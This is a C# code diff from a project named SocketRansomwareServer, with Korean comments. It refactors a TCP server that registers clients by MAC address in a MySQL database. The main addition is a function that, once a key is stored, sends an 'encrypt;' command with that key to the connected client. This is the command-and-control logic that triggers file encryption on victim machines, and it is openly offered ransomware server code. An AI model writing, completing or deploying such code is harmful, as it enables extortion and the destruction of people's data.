@@ -47,13 +47,11 @@ namespace SocketRansomwareServer
 
         public void Accept()
         {
-            TcpClient client; //클라이언트클래스
             TcpListener listener = new TcpListener(IPAddress.Any, 8080); //서버클래스
-            client = default(TcpClient); //무슨 메소드인지는 모르겠네요
             listener.Start(); //서버시작
             while (true)
             {
-                client = listener.AcceptTcpClient(); //클라이언트 acccept
+                TcpClient client = listener.AcceptTcpClient();
                 clients cList = new clients(); //클라이언트 데이터반환 쓰레드
                 cList.Set(client, listView1); //설정+시작
             }
@@ -75,16 +73,14 @@ namespace SocketRansomwareServer
             public void Run()
             {
                 byte[] bytes = new byte[1024];
-                string str = string.Empty;
-                NetworkStream net;//네트워크스트림(소켓상에 데이터가 존재하는곳)
                 while (true)
                 {
                     try
                     {
                         for (int i = 0; i < 1024; i++) bytes[i] = 0; //c++로따지면 ZeroMemory(bytes,1024);
-                        net = tcp.GetStream(); //네트워크스트림 얻어오기
+                        NetworkStream net = tcp.GetStream();//네트워크스트림(소켓상에 데이터가 존재하는곳)
                         net.Read(bytes, 0, bytes.Length); //스트림읽기 C++로따지면 recv함수
-                        str = Encoding.Default.GetString(bytes).Trim('\0'); //인코딩
+                        string str = Encoding.Default.GetString(bytes).Trim('\0');
                         string[] request = str.Split(';');
                         if (request[0] == "mac") CheckDB(request[1]);
                         UpdateListViewSafe(str);
@@ -129,7 +125,12 @@ namespace SocketRansomwareServer
                             Console.WriteLine(key);
                             command = new MySqlCommand(insertQuery, DB.Instance._connection);
 
-                            if (command.ExecuteNonQuery() == 1) Console.WriteLine("DB 저장 성공");
+                            if (command.ExecuteNonQuery() == 1)
+                            {
+                                Console.WriteLine("DB 저장 성공");
+                                SendKeyClient("encrypt;" + key);
+
+                            }
                             else Console.WriteLine("DB 저장 실패");
                         }
                         
@@ -138,6 +139,26 @@ namespace SocketRansomwareServer
                 {
                     Console.WriteLine(e.Message);
                 }
+            }
+
+            //클라이언트로 키 전송
+            public void SendKeyClient(string key)
+            {
+                try
+                {
+                    byte[] buffer = new byte[1024];
+                    NetworkStream net;
+                    for (int i = 0; i < 1024; i++) buffer[i] = 0; //c++로따지면 ZeroMemory(bytes,1024);
+                    buffer = Encoding.Default.GetBytes(key);
+                    net = tcp.GetStream(); //네트워크스트림 얻어오기
+                    net.Write(buffer, 0, buffer.Length);
+                    net.Flush();
+                } catch(Exception e)
+                {
+                    Console.WriteLine($"전송 실패 : {e.Message}");
+                }
+                
+                
             }
             private void UpdateListViewSafe(string text)
             {
